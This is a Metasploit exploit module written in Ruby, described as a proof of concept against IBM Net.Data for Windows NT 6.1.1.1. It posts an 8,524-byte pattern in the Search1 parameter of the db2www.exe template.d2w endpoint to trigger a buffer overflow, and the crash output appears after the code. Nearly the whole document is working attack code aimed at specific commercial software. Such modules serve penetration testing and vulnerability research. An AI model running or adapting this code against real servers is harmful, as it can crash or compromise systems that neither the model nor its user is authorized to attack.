require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Net.Data for Windows PoC',
			'Description'    => %q{
					This module is simply a trigger IBM Net.Data for 
				Windows NT Version 6.1.1.1. When passing an overly long string
				to the search1 parameter in template.d2w bad things happen. 
			},
			'Author'         => [ 'Mario Ceballos' ],
			'License'        => 'BSD_LICENSE',
			'References'     =>
				[
					[ 'URL', 'http://databasesecurity.com/IBM-Net.Data.zip' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'IBM Net.Data for Windows NT Version 6.1.1.1', { } ], 
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 27 2011'))

		register_options( 
			[ 
				Opt::RPORT(80), 
			 ], self.class )
	end

	def exploit

		trigger =  pattern_create(8524) 

		print_status("Trying target #{target.name}...")

		res = send_request_cgi(
			{
				'uri'		=> '/cgi-bin/db2www.exe/template.d2w/report',
				'method'	=> 'POST',
				'version'	=> '1.1',
				'data'		=> 'Search1=' + trigger,
			}, 5)

		puts res.body
		
	end

end
__END__
This application has requested the Runtime to terminate it in an unusual way.
Please contact the application's support team for more information.
input buffer overflow, can't enlarge buffer because scanner uses REJECT
